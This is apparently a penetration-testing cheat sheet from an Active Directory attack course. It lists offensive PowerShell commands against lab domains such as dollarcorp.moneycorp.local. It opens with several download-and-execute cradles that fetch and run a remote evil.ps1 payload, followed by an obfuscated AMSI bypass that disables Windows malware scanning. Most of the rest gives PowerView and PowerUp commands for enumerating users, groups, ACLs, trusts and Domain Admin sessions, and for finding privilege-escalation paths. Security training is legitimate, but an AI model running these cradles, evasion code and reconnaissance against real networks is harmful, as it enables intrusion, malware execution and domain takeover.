# power shell script execution
```
Download execute cradle
iex(New-ObjectNet.WebClient).DownloadString('https://webserver/payload.ps1') 

$ie=New-Object-ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep5;$response=$ie.Document.body.innerHTML;$ie.quit();iex$response


PSv3 onwards -iex(iwr'http://192.168.230.1/evil.ps1')


$h=New-Object-ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText


$wr=[System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")

$r=$wr.GetResponse()

IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

```

# AMSI bypass:- 
```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```



# Domain Enumeration



# get current domain

# using .NET
```
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

# Using powershell
```ps
Get-NetDomain
```

# using ADModule-master 
```ps
Import-Module .\Microsoft.ActiveDirectory.Managemnt.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
Get-ADDomain
```

# Get Object of another domain

# using PS

`Get-NetDomain -Domain moneycorp.local`

# using ADModule
`Get-ADDomain -Identity moneycorp.local`

# Get domain SID for the current domain

# using ps
`Get-DomainSID`

# using ADModule
`(Get-ADDomain).DomainSID`

# Get domain policy for the current domain

# Using ps
`Get-DomainPolicy`

# using AD-module
`(Get-DomainPolicy)."system access"`

# Get domain policy for another domain
`(Get-DomainPolicy -domain moneycorp.local)."system access"`


# Get domain controllers for current domain
# using ps
`Get-NetDomainController`

# using AD-module
`Get-ADDomainController`


# Get domain controllers for another domain

# using ps
`Get-NetDomainController -Domain moneycorp.local`

# Using AD-module
`Get-ADDomainController -DomainName moneycorp.local -Discover`

# Get a list of users in the current domain
```
Get-NetUser
Get-NetUser –Username student1
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties * 

```


# Get list of all properties for users in the current domain

```
Get-UserProperty
Get-UserProperty –Properties pwdlastset
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

# Search for a particular string in a user's attributes:

```
Find-UserField -SearchField Description -SearchTerm "built"
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

# Get a list of computers in the current domain

```
Get-NetComputer
Get-NetComputer –OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
```
```
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```
# Get all the groups in the current domain
```
Get-NetGroup
Get-NetGroup –Domain <targetdomain>
Get-NetGroup –FullData
Get-ADGroup -Filter * | select Name 
Get-ADGroup -Filter * -Properties *
```
# Get all groups containing the word "admin" in group name
```
Get-NetGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

# Get all the members of the Domain Admins group

```
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```
# Get the group membership for a user: 
```
Get-NetGroup –UserName "student1"
Get-ADPrincipalGroupMembership -Identity student1
```
# List all the local groups on a machine (needs administrator privs on non-dc machines) : 
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```
# Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

# # Get actively logged users on a computer (needs local admin rights on the target)

```
Get-NetLoggedon –ComputerName <servername>
```
# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedOn –ComputerName <servername>
```

# Find shares on hosts in current domain.

`Invoke-ShareFinder –Verbose`

# Find sensitive files on computers in the domain
`Invoke-FileFinder –Verbose`

# Get all fileservers of the domain
`Get-NetFileServer`

# Get list of GPO in current domain.
```
Get-NetGPO
Get-NetGPO -ComputerName dcorp-
student1.dollarcorp.moneycorp.local 
Get-GPO -All (GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path
C:\Users\Administrator\report.html (Provides RSoP)
```
# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
`Get-NetGPOGroup`

# Get users which are in a local group of a machine using GPO
```
Find-GPOComputerAdmin –Computername dcorp-
student1.dollarcorp.moneycorp.local
```
# Get machines where the given user is member of a specific group
`Find-GPOLocation -UserName student1 -Verbose`

# Get OUs in a domain
```
Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties *
``` 
# Get GPO applied on an OU. Read GPOname from gplink attribute from 
```
Get-NetOU
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-
83E8F4EF8081}"
Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 
(GroupPolicy module) 
```
# Get the ACLs associated with the specified object
`Get-ObjectAcl -SamAccountName student1 –ResolveGUIDs`

# Get the ACLs associated with the specified prefix to be used for search
`Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose`

# We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
`(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp ,DC=local').Access`

# Get the ACLs associated with the specified LDAP path to be used for search
`Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose`

# Search for interesting ACEs
`Invoke-ACLScanner -ResolveGUIDs`
# Get the ACLs associated with the specified path
`Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`

# Domain Trust mapping
# Get a list of all domain trusts for the current domain
```
Get-NetDomainTrust
Get-NetDomainTrust –Domain us.dollarcorp.moneycorp.local
Get-ADTrust
Get-ADTrust –Identity us.dollarcorp.moneycorp.local
```

# Forest mapping
# Get details about the current forest
```
Get-NetForest
Get-NetForest –Forest eurocorp.local
Get-ADForest
Get-ADForest –Identity eurocorp.local
```
# Get all domains in the current forest
```
Get-NetForestDomain
Get-NetForestDomain –Forest eurocorp.local
(Get-ADForest).Domains
```
# Forest mapping
# Get all global catalogs for the current forest
```
Get-NetForestCatalog
Get-NetForestCatalog –Forest eurocorp.local
Get-ADForest | select -ExpandProperty GlobalCatalogs
```
# Map trusts of a forest
```
Get-NetForestTrust
Get-NetForestTrust –Forest eurocorp.local
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```
# Find all machines on the current domain where the current user has local admin access
`Find-LocalAdminAccess –Verbose`

# This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded 
`Invoke-CheckLocalAdminAccess` on each machine.

# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1


# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
`Invoke-EnumerateLocalAdmin –Verbose`
# This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded Get-NetLocalGroup on each machine. 

# Find computers where a domain admin (or specified user/group) has sessions:
```
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```
# This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list of computers (Get-NetComputer) and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from each machine.
# To confirm admin access
`Invoke-UserHunter -CheckAccess`

# Find computers where a domain admin is logged-in.
`Invoke-UserHunter -Stealth`
# This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from each machine.

# Services Issues using PowerUp
# Get services with unquoted paths and a space in their name.
`Get-ServiceUnquoted -Verbose`
# Get services where the current user can write to its binary path or change arguments to the binary
`Get-ModifiableServiceFile -Verbose`
# Get the services whose configuration current user can modify.
`Get-ModifiableService -Verbose`

# Run all checks from :
```
– PowerUp
Invoke-AllChecks
– BeRoot is an executable:
.\beRoot.exe
– Privesc:
Invoke-PrivEsc
```
